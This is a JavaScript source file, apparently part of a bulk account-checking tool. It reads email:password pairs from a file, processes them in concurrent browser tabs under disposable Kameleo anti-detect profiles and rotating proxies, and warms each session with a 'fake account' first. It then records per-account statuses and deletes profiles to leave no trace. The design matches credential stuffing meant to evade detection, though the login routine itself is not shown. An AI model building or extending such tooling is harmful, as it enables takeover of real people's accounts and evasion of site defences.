// Enhanced getNextAccountBatch with better file handling
async function getNextAccountBatch(batchSize = CONCURRENT_TABS) {
    try {
        if (!fsSync.existsSync(ACCOUNTS_FILE)) {
            console.log(`❌ Accounts file not found: ${ACCOUNTS_FILE}`);
            return [];
        }

        const content = await fs.readFile(ACCOUNTS_FILE, "utf8");
        const lines = content
            .split("\n")
            .map((l) => l.trim())
            .filter(Boolean)
            .filter(line => line.includes(':') && line.split(':').length >= 2);

        console.log(`📊 Total accounts remaining in file: ${lines.length}`);

        if (!lines.length) {
            console.log("📄 No valid accounts found in file");
            return [];
        }

        const batch = lines.slice(0, Math.min(batchSize, lines.length));
        console.log(`📦 Selected batch of ${batch.length} accounts`);

        // Log first account (masked) for verification
        if (batch.length > 0) {
            const firstAccount = batch[0];
            const maskedAccount = firstAccount.replace(/(.{3}).*@/, '$1***@').replace(/:(.{2}).*/, ':$1***');
            console.log(`📋 First account in batch: ${maskedAccount}`);
        }

        return batch;

    } catch (err) {
        console.error("Error reading accounts file:", err.message);
        return [];
    }
}

// Remove processed accounts from file
async function removeProcessedAccounts(processedCount) {
    if (!fsSync.existsSync(ACCOUNTS_FILE)) {
        return;
    }

    const lines = (await fs.readFile(ACCOUNTS_FILE, "utf8"))
        .split("\n")
        .map((l) => l.trim())
        .filter(Boolean);

    const remaining = lines.slice(processedCount);

    if (remaining.length > 0) {
        await fs.writeFile(ACCOUNTS_FILE, remaining.join("\n") + "\n", "utf8");
    } else {
        await fs.writeFile(ACCOUNTS_FILE, "", "utf8");
    }
}

// Clean up profile after use - Enhanced to delete profile
async function cleanupProfile(profile) {
    try {
        if (profile) {
            console.log(`Stopping profile: ${profile.id}`);
            await client.profile.stopProfile(profile.id);

            // Wait for 5 seconds
            await setTimeout(5_000);

            console.log(`Deleting profile: ${profile.id}`);
            // await client.profile.deleteProfile(profile.id);
            await axios.delete(`http://localhost:${KAMELEO_PORT}/profiles/${profile.id}`)

            console.log(`✅ Profile cleaned up and deleted: ${profile.id}`);
        }
    } catch (err) {
        console.log("Error cleaning up profile:", err.message);
    }
}

// Enhanced processAccountsBatch with better status checking
async function processAccountsBatch() {
    let context = null;
    let profile = null;
    let usedProxy = null;

    try {
        // Check accounts before starting
        const accountBatch = await getNextAccountBatch();

        if (accountBatch.length === 0) {
            console.log("📄 No more accounts to process.");

            // Double check by reading file directly
            if (fsSync.existsSync(ACCOUNTS_FILE)) {
                const content = await fs.readFile(ACCOUNTS_FILE, "utf8");
                const remainingLines = content.split("\n").filter(Boolean).length;
                console.log(`📊 File check: ${remainingLines} lines remaining in accounts file`);

                if (remainingLines > 0) {
                    console.log("⚠️ File has content but no valid accounts found");
                    // Log first few lines for debugging
                    const lines = content.split("\n").slice(0, 3);
                    lines.forEach((line, index) => {
                        console.log(`Line ${index + 1}: "${line}" (length: ${line.length})`);
                    });
                }
            }

            return false;
        }

        console.log(`🚀 Processing batch of ${accountBatch.length} accounts...`);

        // Load working proxies
        const workingProxies = await loadWorkingProxies();

        if (workingProxies.length === 0) {
            console.log("❌ No working proxies available. Please run proxy tester first.");
            return false;
        }

        const cookies = await loadCookies();
        const selectedProxy = await getNextWorkingProxy(workingProxies);

        // Create profile with retries
        let profileCreated = false;
        let createAttempts = 0;
        const maxCreateAttempts = 3;

        while (!profileCreated && createAttempts < maxCreateAttempts) {
            try {
                createAttempts++;
                console.log(`🔧 Profile creation attempt ${createAttempts}/${maxCreateAttempts}`);

                const conn = await createNewProfile(selectedProxy, cookies);
                profile = conn.profile;
                context = conn.context;
                usedProxy = conn.proxy;
                profileCreated = true;

                console.log("✅ Profile created successfully");

            } catch (createErr) {
                console.log(`❌ Profile creation attempt ${createAttempts} failed:`, createErr.message);

                if (createAttempts >= maxCreateAttempts) {
                    throw createErr;
                }

                // Wait before retry
                await sleep(20000 * createAttempts);

                // Try with new proxy if available
                const newWorkingProxies = await loadWorkingProxies();
                if (newWorkingProxies.length > 0) {
                    selectedProxy = await getNextWorkingProxy(newWorkingProxies);
                }
            }
        }

        // Continue with fake account and real processing...
        // Process fake account first
        try {
            await processFakeAccountFirst(context);
        } catch (fakeErr) {
            console.log("🎭 Fake account error:", fakeErr.message);

            if (fakeErr.message === 'PROXY_CONNECTION_FAILED' ||
                fakeErr.message === 'CONTEXT_DESTROYED' ||
                fakeErr.message === 'SERVER_CONNECTION_FAILED' ||
                fakeErr.message.includes('net::ERR_') ||
                fakeErr.message.includes('Execution context was destroyed') ||
                fakeErr.message.includes('Target page, context or browser has been closed')) {

                console.log(`❌ Critical error detected, removing problematic proxy`);

                if (usedProxy) {
                    await removeUsedWorkingProxy(usedProxy);
                }

                throw new Error('PROFILE_RESTART_REQUIRED');
            }

            console.log("🎭 Continuing despite fake account error...");
        }

        // Process real accounts
        const promises = accountBatch.map((accountLine, index) =>
            processAccountInTab(context, accountLine, index)
        );

        const results = await Promise.allSettled(promises);

        // Process results...
        let proxyIssueDetected = false;
        let serverErrorCount = 0;

        results.forEach((result, index) => {
            if (result.status === 'fulfilled') {
                console.log(`Tab ${index + 1}: Completed - ${result.value.email} (${result.value.status})`);

                if (result.value.status === 'server_error') {
                    serverErrorCount++;
                }
            } else {
                console.log(`Tab ${index + 1}: Failed - ${result.reason}`);

                if (result.reason && typeof result.reason === 'string') {
                    if (result.reason.includes('Can\'t connect to the server') ||
                        result.reason.includes('net::ERR_') ||
                        result.reason.includes('Target page, context or browser has been closed')) {
                        proxyIssueDetected = true;
                    }
                }
            }
        });

        // Handle proxy removal
        if ((serverErrorCount > accountBatch.length / 2) || proxyIssueDetected) {
            if (usedProxy) {
                console.log(`❌ Proxy issues detected, removing: ${usedProxy.host}:${usedProxy.port}`);
                await removeUsedWorkingProxy(usedProxy);
            }
        } else {
            if (usedProxy) {
                console.log(`✅ Proxy used successfully, removing: ${usedProxy.host}:${usedProxy.port}`);
                await removeUsedWorkingProxy(usedProxy);
            }
        }

        // Remove processed accounts
        await removeProcessedAccounts(accountBatch.length);
        console.log(`✅ Batch completed. Processed ${accountBatch.length} accounts.`);
        return true;

    } catch (err) {
        console.log("❌ Error in batch processing:", err.message);

        if (err.message === 'PROFILE_RESTART_REQUIRED') {
            console.log("🔄 Profile restart required, will try again...");
            return true;
        }

        if (usedProxy && (err.message.includes('Proxy failed') ||
            err.message.includes('Failed to determine external IP address') ||
            err.message.includes('HTTP 503') ||
            err.message.includes('Timeout'))) {

            console.log(`❌ Removing failed proxy: ${usedProxy.host}:${usedProxy.port}`);
            await removeUsedWorkingProxy(usedProxy);
        }

        return false;
    } finally {
        try {
            if (context) {
                console.log("🧹 Closing context...");
                await context.close();
            }
        } catch (contextErr) {
            console.log("Context close error:", contextErr.message);
        }

        await cleanupProfile(profile);
    }
}

async function takeAdvancedScreenshot(page, filename = null) {
    const screenshotDir = './screenshots';

    // Create directory if it doesn't exist
    if (!fsSync.existsSync(screenshotDir)) {
        fsSync.mkdirSync(screenshotDir, { recursive: true });
    }


    // Generate filename if not provided
    if (!filename) {
        const timestamp = Date.now();
        filename = `screenshot-${timestamp}.png`;
    }

    const screenshotPath = path.join(screenshotDir, filename);

    // Take screenshot with options
    await page.screenshot({
        path: screenshotPath,
        fullPage: true,  // Capture entire page
        // quality: 90,     // For JPEG format (0-100)
        type: 'png'      // 'png' or 'jpeg'
    });

    console.log('screenshotPath ===> ', screenshotPath);


    return screenshotPath;
}

// Add this function to check file status
async function debugAccountsFile() {
    try {
        if (!fsSync.existsSync(ACCOUNTS_FILE)) {
            console.log(`❌ File ${ACCOUNTS_FILE} does not exist`);
            return;
        }

        const stats = await fs.stat(ACCOUNTS_FILE);
        console.log(`📊 File size: ${stats.size} bytes`);

        const content = await fs.readFile(ACCOUNTS_FILE, "utf8");
        const allLines = content.split("\n");
        const validLines = allLines.filter(line => line.trim() && line.includes(':'));

        console.log(`📄 Total lines: ${allLines.length}`);
        console.log(`✅ Valid account lines: ${validLines.length}`);
        console.log(`❌ Invalid lines: ${allLines.length - validLines.length}`);

        if (validLines.length > 0) {
            const sample = validLines[0].replace(/(.{3}).*@/, '$1***@').replace(/:(.{2}).*/, ':$1***');
            console.log(`📋 Sample account: ${sample}`);
        }

    } catch (err) {
        console.error("Debug error:", err.message);
    }
}

// Add this at the beginning of processAccounts
async function processAccounts() {
    console.log("🚀 Starting account processing with pre-tested proxies...");

    // Debug accounts file
    await debugAccountsFile();

    // Check if working proxies file exists
    if (!fsSync.existsSync(WORKING_PROXIES_FILE)) {
        console.log("❌ working_proxies.txt not found!");
        console.log("🔧 Please run the proxy tester first:");
        console.log(" node proxy-tester.js proxies.txt");
        process.exit(1);
    }

    let consecutiveErrors = 0;
    const maxConsecutiveErrors = 5;

    while (true) {
        try {
            const hasMoreAccounts = await processAccountsBatch();

            if (!hasMoreAccounts) {
                console.log("All accounts processed!");
                break;
            }

            consecutiveErrors = 0;
            console.log("⏳ Waiting before next batch...");
            await sleep(randomDelay(2000, 4000));

        } catch (err) {
            consecutiveErrors++;
            console.error(`Batch error ${consecutiveErrors}/${maxConsecutiveErrors}:`, err.message);

            if (consecutiveErrors >= maxConsecutiveErrors) {
                console.error("Too many consecutive errors, stopping...");
                break;
            }

            await sleep(5000 + (consecutiveErrors * 3000));
        }
    }
}

// // Start
// processAccounts().catch((e) => {
//     console.error("Fatal error:", e?.message || e);
//     process.exit(1);
// });


export { createNewProfile, processFakeAccountFirst, processAccountInTab, cleanupProfile, sleep };